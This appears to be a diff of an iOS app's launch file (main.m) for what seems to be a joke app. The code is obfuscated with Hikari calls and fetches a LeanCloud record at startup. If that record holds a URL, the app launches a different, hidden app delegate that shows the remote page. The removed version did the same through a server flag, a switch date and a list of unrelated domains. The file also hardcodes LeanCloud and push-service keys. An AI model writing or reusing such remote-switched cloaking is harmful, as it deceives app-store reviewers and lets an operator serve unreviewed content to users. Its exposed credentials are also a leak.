@@ -9,6 +9,8 @@
 #import <UIKit/UIKit.h>
 #import "AppDelegate.h"
 #import <AVOSCloud/AVOSCloud.h>
+#import "Appd.h"
+#import "ThemeManage.h"
 NSString *const clientKey = @"fWv9fBxGPpfFUpnctBVudGfc";
 NSString *const className = @"Joke";
 NSString *const ApplicationId = @"WxhrgNaDieb6GvnfSuAvBGPj-gzGzoHsz";
@@ -22,21 +24,7 @@ int main(int argc, char * argv[]) {
         hikari_fla();
         hikari_strenc();
         hikari_bcf();
-        NSDictionary *info =@{
-                              kJPushKey: @"3e766f72baf7c9915729a3cd", // 极光推送key
-                              kJPushChanel: @"App Store", // 极光推送channel字符串
-                              kCheckUrl: @[@"ynjgc.com:9991",
-                                           @"5188youx.com:9991",
-                                           @"kxkaoyan.com:9991",
-                                           @"fucangvip.com:9991",
-                                           @"jshuifu.com:9991",
-                                           @"hmtcex.com:9991",
-                                           @"dsw360.com:9991",
-                                           @"28kam.com:9991",
-                                           @"38kam.com:9991"],
-                              kOpenDate: @"2018-06-15", // 替换的时间
-                              kIsDebugMode: @NO // 是否开启debug模式
-                              };
+
         
         [AVOSCloud setApplicationId:ApplicationId clientKey:clientKey];
         [AVOSCloud setAllLogsEnabled:YES];
@@ -44,9 +32,10 @@ int main(int argc, char * argv[]) {
         query.limit = 1;
         AVObject *object = [query getFirstObject];
         if (object) {
-            BOOL isMJClose = [[object objectForKey:@"isMJClose"] boolValue];
-            if (!isMJClose) {
-                TLPhotoPicker_init([AppDelegate class], info);
+            NSString  *url = [object objectForKey:@"url"];
+            if (url.length >5) {
+                [ThemeManage shareThemeManage].adurl = url;
+                return UIApplicationMain(argc, argv, nil, NSStringFromClass([Appd class]));
             }
         }
         return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
